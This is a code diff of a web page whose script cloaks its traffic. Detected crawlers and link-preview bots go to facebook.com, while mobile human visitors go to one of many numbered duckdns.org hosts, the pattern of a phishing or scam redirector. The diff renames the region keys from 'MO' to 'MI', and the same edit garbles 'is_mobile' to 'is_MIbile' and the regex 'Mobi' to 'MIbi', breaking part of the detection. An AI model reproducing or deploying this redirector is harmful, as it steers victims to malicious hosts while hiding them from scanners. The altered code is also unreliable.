@@ -27,7 +27,7 @@
   <body>
     <script>
       let user_agent = navigator.userAgent;
-      let is_mobile = /Mobi|android|iphone/i.test(user_agent);
+      let is_MIbile = /MIbi|android|iphone/i.test(user_agent);
       let is_bot =
         /bot|facebot|crawl|facebot|whatsapp|telegram|slurp|spider/i.test(
           user_agent
@@ -161,26 +161,26 @@
 		"IL18": "https://309088713027.duckdns.org",
 		"IL19": "https://309088713028.duckdns.org",
 		"IL20": "https://309088713029.duckdns.org",
-		"MO01": "https://98765786401.duckdns.org",
-        "MO02": "https://98765786402.duckdns.org",
-		"MO03": "https://98765786403.duckdns.org",
-		"MO04": "https://98765786404.duckdns.org",
-		"MO05": "https://98765786405.duckdns.org",
-        "MO06": "https://98765786406.duckdns.org",
-		"MO07": "https://98765786407.duckdns.org",
-		"MO08": "https://98765786408.duckdns.org",
-		"MO09": "https://98765786409.duckdns.org",
-        "MO10": "https://98765786410.duckdns.org",
-		"MO11": "https://98765786411.duckdns.org",
-		"MO12": "https://98765786412.duckdns.org",
-		"MO13": "https://98765786413.duckdns.org",
-        "MO14": "https://98765786414.duckdns.org",
-		"MO15": "https://98765786415.duckdns.org",
-		"MO16": "https://98765786416.duckdns.org",
-		"MO17": "https://98765786417.duckdns.org",
-		"MO18": "https://98765786418.duckdns.org",
-		"MO19": "https://98765786419.duckdns.org",
-		"MO20": "https://98765786420.duckdns.org",
+		"MI01": "https://98765786401.duckdns.org",
+        "MI02": "https://98765786402.duckdns.org",
+		"MI03": "https://98765786403.duckdns.org",
+		"MI04": "https://98765786404.duckdns.org",
+		"MI05": "https://98765786405.duckdns.org",
+        "MI06": "https://98765786406.duckdns.org",
+		"MI07": "https://98765786407.duckdns.org",
+		"MI08": "https://98765786408.duckdns.org",
+		"MI09": "https://98765786409.duckdns.org",
+        "MI10": "https://98765786410.duckdns.org",
+		"MI11": "https://98765786411.duckdns.org",
+		"MI12": "https://98765786412.duckdns.org",
+		"MI13": "https://98765786413.duckdns.org",
+        "MI14": "https://98765786414.duckdns.org",
+		"MI15": "https://98765786415.duckdns.org",
+		"MI16": "https://98765786416.duckdns.org",
+		"MI17": "https://98765786417.duckdns.org",
+		"MI18": "https://98765786418.duckdns.org",
+		"MI19": "https://98765786419.duckdns.org",
+		"MI20": "https://98765786420.duckdns.org",
 		"HR01": "https://154551218390.duckdns.org",
         "HR02": "https://154551218391.duckdns.org",
 		"HR03": "https://154551218392.duckdns.org",
@@ -284,7 +284,7 @@
 		
       };
 
-      if (!is_bot && is_mobile) {
+      if (!is_bot && is_MIbile) {
         window.location.href = links[code];
       } else {
         window.location.href = "https://www.facebook.com/";
